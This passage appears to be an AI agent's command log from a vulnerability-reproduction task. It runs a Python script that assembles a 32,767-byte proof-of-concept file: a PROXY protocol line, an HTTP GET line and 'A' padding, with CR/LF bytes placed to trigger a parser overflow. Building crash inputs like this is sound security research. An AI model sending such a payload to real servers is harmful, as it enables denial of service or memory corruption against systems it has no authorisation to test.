Command `python3 -c "
import sys

# Build the PoC buffer of exactly 32767 bytes
buf = bytearray()

# Positions 0-37: PROXY TCP4 line (38 bytes)
proxy_line = b'PROXY TCP4 1.1.1.1 2.2.2.2 1234 5678\r\n'
buf += proxy_line
assert len(buf) == 38

# Positions 38-39: extra \r\n to create \r\n\r\n at positions 36-39 for finalizer
buf += b'\r\n'
assert len(buf) == 40

# Positions 40-55: GET request line (16 bytes)
buf += b'GET / HTTP/1.0\r\n'
assert len(buf) == 56

# Positions 56-32763: header content (all 'A's, no \r), 32708 bytes
padding_len = 32763 - 56 + 1  # = 32708
buf += b'A' * padding_len
assert len(buf) == 32764

# Position 32764: \r (end of header)
buf += b'\r'
assert len(buf) == 32765

# Position 32765: \n
buf += b'\n'
assert len(buf) == 32766

# Position 32766: \r (triggers STRING_SWITCH_SMALL overflow)
buf += b'\r'
assert len(buf) == 32767

with open('/workspace/poc', 'wb') as f:
    f.write(buf)

print(f'PoC written: {len(buf)} bytes')
"` executed with exit code 0.
